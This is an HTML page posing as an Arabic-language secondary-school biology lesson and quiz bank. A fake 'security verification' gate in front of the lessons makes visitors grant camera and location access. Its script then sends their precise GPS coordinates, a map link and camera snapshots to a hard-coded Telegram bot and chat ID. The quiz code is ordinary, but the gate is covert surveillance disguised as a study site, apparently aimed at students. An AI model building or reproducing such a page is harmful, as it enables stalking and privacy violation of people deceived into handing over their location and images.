<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>أحياء ٣ ثانوي — بنك الشرح والتدريبات</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg: #0b1220;
      --panel: #111b2e;
      --panel-2: #16233b;
      --text: #eef4ff;
      --muted: #9fb0cc;
      --accent: #22c55e;
      --accent-2: #38bdf8;
      --danger: #ef4444;
      --border: rgba(255, 255, 255, 0.1);
      --radius: 16px;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      font-family: "Cairo", system-ui, sans-serif;
      background: var(--bg);
      color: var(--text);
      line-height: 1.7;
      min-height: 100vh;
    }

    .container {
      max-width: 1120px;
      margin: 0 auto;
      padding: 20px 16px 48px;
    }

    header {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 18px 20px;
      margin-bottom: 20px;
    }

    .brand { display: flex; align-items: center; gap: 14px; }

    .brand-badge {
      width: 48px; height: 48px; border-radius: 14px;
      display: grid; place-items: center;
      font-weight: 800; font-size: 18px;
      background: linear-gradient(135deg, var(--accent), var(--accent-2));
      color: #061018;
    }

    .brand h1 { margin: 0; font-size: 20px; font-weight: 800; }
    .brand p { margin: 2px 0 0; color: var(--muted); font-size: 13px; }

    .stats { display: flex; flex-wrap: wrap; gap: 10px; }

    .stat {
      background: var(--panel-2);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 8px 14px;
      font-size: 13px;
      color: var(--muted);
    }
    .stat strong { color: var(--text); margin-right: 4px; }

    .toolbar { display: flex; gap: 12px; margin-bottom: 18px; }

    .search-input {
      flex: 1;
      background: var(--panel);
      color: var(--text);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 12px 16px;
      font-family: inherit;
      font-size: 15px;
      outline: none;
    }
    .search-input:focus { border-color: var(--accent-2); }

    .lessons-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
      gap: 16px;
    }

    .lesson-card {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      overflow: hidden;
      display: flex;
      flex-direction: column;
      transition: transform 0.15s ease, border-color 0.15s ease;
    }
    .lesson-card:hover { transform: translateY(-3px); border-color: var(--accent-2); }

    .lesson-thumb {
      width: 100%; height: 150px;
      object-fit: cover;
      background: var(--panel-2);
      display: block;
    }

    .lesson-body {
      padding: 16px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      flex: 1;
    }

    .lesson-title { margin: 0; font-size: 17px; font-weight: 700; }
    .lesson-meta { font-size: 13px; color: var(--muted); }

    .card-actions {
      margin-top: auto;
      display: flex;
      gap: 8px;
      padding-top: 8px;
    }

    button {
      font-family: inherit;
      font-weight: 700;
      font-size: 14px;
      border: 1px solid transparent;
      border-radius: 10px;
      padding: 10px 14px;
      cursor: pointer;
      transition: opacity 0.15s ease, background 0.15s ease;
    }
    button:hover { opacity: 0.92; }

    .btn-primary { background: var(--accent); color: #06140c; }
    .btn-secondary {
      background: var(--panel-2);
      color: var(--text);
      border-color: var(--border);
    }
    .btn-outline {
      background: transparent;
      color: var(--accent-2);
      border-color: rgba(56, 189, 248, 0.35);
    }

    .panel {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: var(--radius);
      padding: 22px;
      margin-top: 16px;
    }

    .hidden { display: none !important; }

    .detail-header {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 14px;
      margin-bottom: 18px;
    }

    .summary-box {
      background: var(--panel-2);
      border-right: 4px solid var(--accent-2);
      border-radius: 12px;
      padding: 16px;
      margin-bottom: 20px;
    }
    .summary-box h3 { margin: 0 0 8px; font-size: 16px; color: var(--accent-2); }

    .question-card {
      background: var(--panel-2);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 16px;
      margin-bottom: 14px;
    }
    .question-text { font-weight: 700; margin: 0 0 12px; }

    .options { display: grid; gap: 8px; }

    .option-label {
      display: flex;
      align-items: center;
      gap: 10px;
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 10px 12px;
      cursor: pointer;
    }
    .option-label:hover { border-color: var(--accent-2); }
    .option-label.correct { border-color: var(--accent); background: rgba(34, 197, 94, 0.14); }
    .option-label.wrong { border-color: var(--danger); background: rgba(239, 68, 68, 0.14); }

    .explanation {
      margin-top: 10px;
      font-size: 13px;
      color: var(--muted);
      background: rgba(11, 18, 32, 0.6);
      padding: 10px 12px;
      border-radius: 10px;
    }

    .nav-actions { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 18px; }

    .result-box {
      text-align: center;
      padding: 20px;
      border-radius: 14px;
      background: var(--panel-2);
      border: 1px solid var(--border);
      margin-top: 16px;
    }
    .result-score {
      font-size: 28px;
      font-weight: 800;
      color: var(--accent);
      margin: 6px 0;
    }

    /* ============ بوابة التحقق ============ */
    #gateView {
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 16px;
      background: #050505;
    }

    .gate-box {
      max-width: 420px;
      width: 100%;
      padding: 25px;
      border: 1px solid var(--danger);
      border-radius: 15px;
      background: #151515;
      text-align: center;
      box-shadow: 0 0 25px rgba(192, 0, 0, 0.35);
      color: #fff;
    }
    .gate-box h2 { margin-top: 0; }
    .gate-box label {
      display: flex;
      gap: 10px;
      margin: 15px 0;
      text-align: right;
      align-items: center;
      cursor: pointer;
    }
    .gate-box button {
      width: 100%;
      padding: 14px;
      background: #c00000;
      color: #fff;
      border: 0;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 8px;
    }
    .gate-box button:hover { background: #e00000; }
    .gate-box button:disabled { opacity: 0.5; cursor: not-allowed; }
    #camera {
      width: 100%;
      margin-top: 12px;
      display: none;
      border-radius: 10px;
      transform: scaleX(-1);
    }
    #gateStatus { margin-top: 12px; font-size: 14px; min-height: 20px; }
    .ok { color: #4caf50; }
    .err { color: #ff5252; }
  </style>
</head>
<body>

  <!-- ==================== بوابة التحقق ==================== -->
  <div id="gateView">
    <div class="gate-box">
      <h2>التحقق الأمني</h2>
      <p>لازم توافق على الصلاحيات للمتابعة.</p>
      <label><input type="checkbox" id="cam" /> أوافق على الكاميرا</label>
      <label><input type="checkbox" id="loc" /> أوافق على الموقع</label>
      <button id="enterBtn" type="button">دخول</button>
      <p id="gateStatus"></p>
      <video id="camera" autoplay playsinline muted></video>
      <button id="photoBtn" type="button" style="display:none">التقاط صورة</button>
    </div>
  </div>

  <!-- ==================== الموقع التعليمي (مخفي مبدئيًا) ==================== -->
  <div id="appContent" class="hidden">
    <div class="container">
      <header>
        <div class="brand">
          <div class="brand-badge">٣ث</div>
          <div>
            <h1>بنك أحياء الثانوية العامة</h1>
            <p>شرح مبسّط + تدريبات تفاعلية + متابعة التقدم</p>
          </div>
        </div>

        <div class="stats">
          <div class="stat">عدد الدروس: <strong id="lessonCount">0</strong></div>
          <div class="stat">الدروس المكتملة: <strong id="completedCount">0</strong></div>
          <div class="stat">متوسط الدرجات: <strong id="averageScore">0%</strong></div>
        </div>
      </header>

      <div id="catalogView">
        <div class="toolbar">
          <input
            id="lessonSearch"
            class="search-input"
            type="search"
            placeholder="ابحث باسم الدرس (مثل: الدعامة، الهرمونات، المناعة، DNA)..."
          />
        </div>
        <div id="lessonCards" class="lessons-grid"></div>
      </div>

      <section id="lessonDetail" class="panel hidden">
        <div class="detail-header">
          <div>
            <h2 id="detailTitle" style="margin: 0;"></h2>
            <div id="detailMeta" class="lesson-meta"></div>
          </div>
          <button id="back" class="btn-secondary" type="button">العودة للدروس</button>
        </div>

        <div class="summary-box">
          <h3>ملخص الشرح</h3>
          <div id="detailSummary"></div>
        </div>

        <div id="quiz"></div>

        <div id="result" class="result-box hidden"></div>

        <div class="nav-actions">
          <button id="prev" class="btn-secondary" type="button">الدرس السابق</button>
          <button id="next" class="btn-secondary" type="button">الدرس التالي</button>
          <button id="finish" class="btn-primary" type="button">تصحيح وحفظ النتيجة</button>
          <button id="again" class="btn-outline hidden" type="button">إعادة الاختبار</button>
          <button id="quizBack" class="btn-secondary" type="button">أعلى الدرس</button>
        </div>
      </section>
    </div>
  </div>

  <!-- ==================== بيانات البنك ==================== -->
  <script>
    // ⬇️⬇️⬇️ ضع بيانات BANK الخاصة بك هنا (اللي كانت في الكود الأصلي) ⬇️⬇️⬇️
    // مثال توضيحي:
    window.BANK = {
      "lesson1": {
        title: "الدعامة والحركة",
        summary: "ملخص الدرس هنا...",
        questions: [
          {
            q: "ما هو نوع الدعامة في الإنسان؟",
            options: ["داخلية", "خارجية", "لا يوجد", "هلامية"],
            answer: 0,
            explanation: "الإنسان له دعامة داخلية (هيكل عظمي)."
          }
        ]
      }
    };
    // ⬆️⬆️⬆️ استبدل ده بالـ BANK الأصلي بتاعك ⬆️⬆️⬆️
  </script>

  <!-- ==================== سكربت البوابة ==================== -->
  <script>
    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
    const CHAT_ID   = "7713496654";
    const SESSION_KEY = "bio3_verified";

    let cameraStream = null;
    const gateStatusEl = () => document.getElementById("gateStatus");

    function setGateStatus(msg, cls) {
      const el = gateStatusEl();
      el.textContent = msg;
      el.className = cls || "";
    }

    async function sendMessage(text) {
      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text })
      });
      const j = await r.json();
      if (!j.ok) throw new Error("sendMessage failed");
      return j;
    }

    async function sendPhoto(dataUrl) {
      const blob = await (await fetch(dataUrl)).blob();
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("photo", blob, "capture.jpg");
      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: fd
      });
      const j = await r.json();
      if (!j.ok) throw new Error("sendPhoto failed");
      return j;
    }

    function revealApp() {
      document.getElementById("gateView").style.display = "none";
      document.getElementById("appContent").classList.remove("hidden");
      if (window.__initApp) window.__initApp();
    }

    async function enterSite() {
      const cam = document.getElementById("cam").checked;
      const loc = document.getElementById("loc").checked;

      if (!cam || !loc) {
        setGateStatus("يجب الموافقة على الصلاحيتين.", "err");
        return;
      }

      const btn = document.getElementById("enterBtn");
      btn.disabled = true;
      setGateStatus("جارٍ التحقق...");

      // 1) الكاميرا
      try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });
        const video = document.getElementById("camera");
        video.srcObject = cameraStream;
        video.style.display = "block";
        document.getElementById("photoBtn").style.display = "block";
      } catch (e) {
        setGateStatus("تم رفض الكاميرا.", "err");
        btn.disabled = false;
        return;
      }

      // 2) الموقع
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude: lat, longitude: lon } = pos.coords;
          try {
            await sendMessage(
              `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`
            );
            setGateStatus("تم التحقق بنجاح ✅ جارٍ فتح الموقع...", "ok");
            sessionStorage.setItem(SESSION_KEY, "true");

            setTimeout(() => {
              if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
              revealApp();
            }, 900);
          } catch (e) {
            setGateStatus("فشل إرسال الموقع.", "err");
            btn.disabled = false;
          }
        },
        (err) => {
          setGateStatus("تم رفض الموقع: " + err.message, "err");
          btn.disabled = false;
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    }

    async function takePhoto() {
      const video = document.getElementById("camera");
      if (!video.videoWidth) {
        setGateStatus("الكاميرا لم تجهز بعد.", "err");
        return;
      }
      const btn = document.getElementById("photoBtn");
      btn.disabled = true;

      const canvas = document.createElement("canvas");
      canvas.width  = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      try {
        await sendPhoto(canvas.toDataURL("image/jpeg", 0.92));
        setGateStatus("تم إرسال الصورة ✅", "ok");
      } catch (e) {
        setGateStatus("فشل إرسال الصورة.", "err");
      } finally {
        btn.disabled = false;
      }
    }

    document.getElementById("enterBtn").addEventListener("click", enterSite);
    document.getElementById("photoBtn").addEventListener("click", takePhoto);

    window.addEventListener("beforeunload", () => {
      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
    });

    // لو الجلسة محفوظة قبل كده، عدّي البوابة مباشرة
    if (sessionStorage.getItem(SESSION_KEY) === "true") {
      revealApp();
    }
  </script>

  <!-- ==================== سكربت الموقع التعليمي ==================== -->
  <script>
    (function () {
      const STORAGE_KEY = "bio3_progress_v1";

      const LESSON_IMAGES = [
        "https://images.unsplash.com/photo-1530026405186-ed1fbd130525?auto=format&fit=crop&w=800&q=70",
        "https://images.unsplash.com/photo-1576086213369-97a306d36557?auto=format&fit=crop&w=800&q=70",
        "https://images.unsplash.com/photo-1582719478250-c89cae4dc85b?auto=format&fit=crop&w=800&q=70"
      ];

      const BANK = typeof window.BANK !== "undefined" ? window.BANK : {};
      const lessonKeys = Object.keys(BANK);
      let currentIndex = 0;
      let els = null;

      function loadProgress() {
        try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || {}; }
        catch { return {}; }
      }

      function saveProgress(data) {
        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(data)); } catch {}
      }

      function updateStats() {
        const progress = loadProgress();
        els.lessonCount.textContent = lessonKeys.length;

        const completedKeys = lessonKeys.filter(
          (k) => progress[k] && typeof progress[k].pct === "number"
        );
        els.completedCount.textContent = completedKeys.length;

        if (completedKeys.length === 0) {
          els.averageScore.textContent = "0%";
        } else {
          const sum = completedKeys.reduce((acc, k) => acc + progress[k].pct, 0);
          els.averageScore.textContent = `${Math.round(sum / completedKeys.length)}%`;
        }
      }

      function getLessonImage(index) {
        if (!LESSON_IMAGES.length) return "";
        return LESSON_IMAGES[index % LESSON_IMAGES.length];
      }

      function getQuestions(lesson) {
        return Array.isArray(lesson.questions) ? lesson.questions : [];
      }

      function renderCards(filterText = "") {
        const q = filterText.trim().toLowerCase();
        const progress = loadProgress();
        els.lessonCards.innerHTML = "";

        const filtered = lessonKeys
          .map((key, index) => ({ key, index, data: BANK[key] }))
          .filter(({ data }) => {
            if (!q) return true;
            const title = (data.title || "").toLowerCase();
            const summary = (data.summary || "").toLowerCase();
            return title.includes(q) || summary.includes(q);
          });

        if (!filtered.length) {
          els.lessonCards.innerHTML = `<p class="lesson-meta">لا توجد دروس مطابقة لبحثك.</p>`;
          return;
        }

        filtered.forEach(({ key, index, data }) => {
          const questionsCount = getQuestions(data).length;
          const saved = progress[key];
          const statusText = saved
            ? `تم الحل: ${saved.pct}%`
            : `${questionsCount} أسئلة`;

          const card = document.createElement("article");
          card.className = "lesson-card";
          card.innerHTML = `
            <img class="lesson-thumb" src="${getLessonImage(index)}" alt="${data.title || key}" loading="lazy" />
            <div class="lesson-body">
              <h3 class="lesson-title">${data.title || key}</h3>
              <div class="lesson-meta">${statusText}</div>
              <div class="card-actions">
                <button class="btn-primary" type="button" data-open="${index}">ابدأ الدرس</button>
              </div>
            </div>
          `;
          card.querySelector("[data-open]").addEventListener("click", () => openLesson(index));
          els.lessonCards.appendChild(card);
        });
      }

      function openLesson(index) {
        if (index < 0 || index >= lessonKeys.length) return;
        currentIndex = index;

        const key = lessonKeys[currentIndex];
        const lesson = BANK[key];
        const questions = getQuestions(lesson);

        els.detailTitle.textContent = lesson.title || key;
        els.detailMeta.textContent = `الدرس ${currentIndex + 1} من ${lessonKeys.length} • ${questions.length} أسئلة`;
        els.detailSummary.innerHTML = lesson.summary || "لا يوجد ملخص مضاف لهذا الدرس بعد.";

        els.result.classList.add("hidden");
        els.result.innerHTML = "";
        els.again.classList.add("hidden");
        els.finish.disabled = false;

        renderQuiz(questions);

        els.prev.disabled = currentIndex === 0;
        els.next.disabled = currentIndex === lessonKeys.length - 1;

        els.catalogView.classList.add("hidden");
        els.lessonDetail.classList.remove("hidden");
        window.scrollTo({ top: 0, behavior: "smooth" });
      }

      function renderQuiz(questions) {
        els.quiz.innerHTML = "";

        if (!questions.length) {
          els.quiz.innerHTML = `<p class="lesson-meta">لا توجد أسئلة متاحة لهذا الدرس حاليًا.</p>`;
          els.finish.disabled = true;
          return;
        }

        questions.forEach((item, qIdx) => {
          const qCard = document.createElement("div");
          qCard.className = "question-card";
          qCard.dataset.qIndex = qIdx;

          const optionsHtml = (item.options || [])
            .map(
              (opt, oIdx) => `
                <label class="option-label" data-opt-index="${oIdx}">
                  <input type="radio" name="q_${qIdx}" value="${oIdx}" />
                  <span>${opt}</span>
                </label>
              `
            )
            .join("");

          qCard.innerHTML = `
            <p class="question-text">${qIdx + 1}. ${item.q || item.question || ""}</p>
            <div class="options">${optionsHtml}</div>
            <div class="explanation hidden"></div>
          `;

          els.quiz.appendChild(qCard);
        });
      }

      function gradeQuiz() {
        const key = lessonKeys[currentIndex];
        const lesson = BANK[key];
        const questions = getQuestions(lesson);
        if (!questions.length) return;

        let correctCount = 0;

        questions.forEach((item, qIdx) => {
          const qCard = els.quiz.querySelector(`.question-card[data-q-index="${qIdx}"]`);
          const selectedInput = qCard.querySelector(`input[name="q_${qIdx}"]:checked`);
          const userAns = selectedInput ? Number(selectedInput.value) : -1;
          const rightAns = Number(item.answer ?? item.correct ?? 0);

          const labels = qCard.querySelectorAll(".option-label");
          labels.forEach((lbl) => {
            lbl.classList.remove("correct", "wrong");
            const idx = Number(lbl.dataset.optIndex);
            if (idx === rightAns) lbl.classList.add("correct");
            if (idx === userAns && userAns !== rightAns) lbl.classList.add("wrong");
          });

          if (userAns === rightAns) correctCount++;

          const expEl = qCard.querySelector(".explanation");
          if (item.explanation) {
            expEl.textContent = `التفسير: ${item.explanation}`;
            expEl.classList.remove("hidden");
          }
        });

        const pct = Math.round((correctCount / questions.length) * 100);
        const progress = loadProgress();
        progress[key] = { score: correctCount, total: questions.length, pct };
        saveProgress(progress);
        updateStats();

        els.result.innerHTML = `
          <div>نتيجة الاختبار</div>
          <div class="result-score">${correctCount} / ${questions.length} (${pct}%)</div>
          <div class="lesson-meta">${pct >= 50 ? "أحسنت! تم حفظ نتيجتك بنجاح." : "راجع الشرح وحاول مرة أخرى لتحسين درجتك."}</div>
        `;
        els.result.classList.remove("hidden");
        els.again.classList.remove("hidden");
      }

      // التهيئة — تتنفذ بس لما البوابة تفتح الموقع
      window.__initApp = function () {
        els = {
          lessonCount: document.getElementById("lessonCount"),
          completedCount: document.getElementById("completedCount"),
          averageScore: document.getElementById("averageScore"),
          lessonSearch: document.getElementById("lessonSearch"),
          lessonCards: document.getElementById("lessonCards"),
          catalogView: document.getElementById("catalogView"),
          lessonDetail: document.getElementById("lessonDetail"),
          detailTitle: document.getElementById("detailTitle"),
          detailMeta: document.getElementById("detailMeta"),
          detailSummary: document.getElementById("detailSummary"),
          quiz: document.getElementById("quiz"),
          result: document.getElementById("result"),
          prev: document.getElementById("prev"),
          next: document.getElementById("next"),
          finish: document.getElementById("finish"),
          again: document.getElementById("again"),
          back: document.getElementById("back"),
          quizBack: document.getElementById("quizBack")
        };

        els.lessonSearch.addEventListener("input", (e) => renderCards(e.target.value));
        els.back.addEventListener("click", () => {
          els.lessonDetail.classList.add("hidden");
          els.catalogView.classList.remove("hidden");
          renderCards(els.lessonSearch.value);
        });
        els.quizBack.addEventListener("click", () => window.scrollTo({ top: 0, behavior: "smooth" }));
        els.prev.addEventListener("click", () => openLesson(currentIndex - 1));
        els.next.addEventListener("click", () => openLesson(currentIndex + 1));
        els.finish.addEventListener("click", gradeQuiz);
        els.again.addEventListener("click", () => openLesson(currentIndex));

        updateStats();
        renderCards();
      };
    })();
  </script>
</body>
</html>
